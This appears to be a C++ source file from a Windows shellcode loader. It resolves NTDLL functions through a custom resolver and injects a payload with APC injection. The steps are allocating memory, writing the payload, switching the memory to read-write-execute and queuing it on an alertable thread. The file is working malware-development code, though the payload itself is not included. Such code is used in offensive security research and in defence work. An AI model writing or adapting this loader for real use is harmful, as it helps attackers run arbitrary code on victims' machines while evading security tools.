#include <stdio.h>
#include <Windows.h>
#include "Structs.h"
#include "Resolver.h"
#include "Loader.h"
#include "Utils.h"

Loader::Loader() {
	resolver = Resolver();
	if (!this->InitSyscallStruct(&St)) {
		printf("[!] Could not init Syscall struct!\n");
		ExitProcess(-1);
	};
}

BOOL Loader::InitSyscallStruct(OUT PSyscall st) {
	HMODULE hNtdll = resolver.GetModHandle(L"NTDLL.DLL");
	if (!hNtdll) return FALSE;

	st->pNtAllocateVirtualMemory =	(fnNtAllocateVirtualMemory)resolver.GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	st->pNtProtectVirtualMemory =	(fnNtProtectVirtualMemory)resolver.GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	st->pNtWriteVirtualMemory =		(fnNtWriteVirtualMemory)resolver.GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	st->pNtQueueApcThread =			(fnNtQueueApcThread)resolver.GetProcAddress(hNtdll, "NtQueueApcThread");

	if (st->pNtAllocateVirtualMemory	== NULL ||
		st->pNtProtectVirtualMemory		== NULL ||
		st->pNtWriteVirtualMemory		== NULL ||
		st->pNtQueueApcThread			== NULL) {
		printf("[!] Syscall struct contains null functions !!!\n");
		return FALSE;
	}
	else {
		return TRUE;
	}
}

BOOL Loader::ApcInjection(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
	printf("[i] SIZE OF PAYLOAD AT START OF INJECTION 0: %zu\n", sPayloadSize);
	sSize = sPayloadSize;
	
	// Allocate memory
	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		return FALSE;
	}
	printf("[+] Allocation of size: %zu\n", sSize);

	// write payload
	printf("[#] Press <Enter> To Write The Payload ...\n");
	getchar();

	printf("[i] SIZE OF PAYLOAD AT START OF INJECTION 1: %zu\n", sPayloadSize);
	printf("\t[i] Writing Payload of Size %zu ...\n", sPayloadSize);
	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, (PULONG)&sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed with Error : 0x%0.08X \n", STATUS);
		printf("[i] Bytes Written : %zu of %zu\n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}

	// Change permissions to RWX
	if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
		return FALSE;
	}

	// Execute Payload:
	printf("[#] Press <Enter> To Run the payload ...");
	getchar();
	if ((STATUS = St.pNtQueueApcThread(hThread, (PIO_APC_ROUTINE)pAddress, NULL, NULL, NULL)) != 0) {
		printf("[!] NtQueueApcThread Failed !!!\n");
		return FALSE;
	}
	printf("[+] DONE \n");
	return TRUE;
}

int Loader::RunApcInjection(IN PVOID pPayload, IN SIZE_T sPayloadSize) {
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AlertableFunction, NULL, NULL, NULL);
	if (!hThread) {
		printf("[!] CreateThread Failed !!!\n");
		return -1;
	}

	if (!this->ApcInjection((HANDLE)-1, hThread, pPayload, sPayloadSize)) {
		return -1;
	}

	printf("[#] Press <Enter> To Quit ...\n");
	getchar();
	return 0;
}

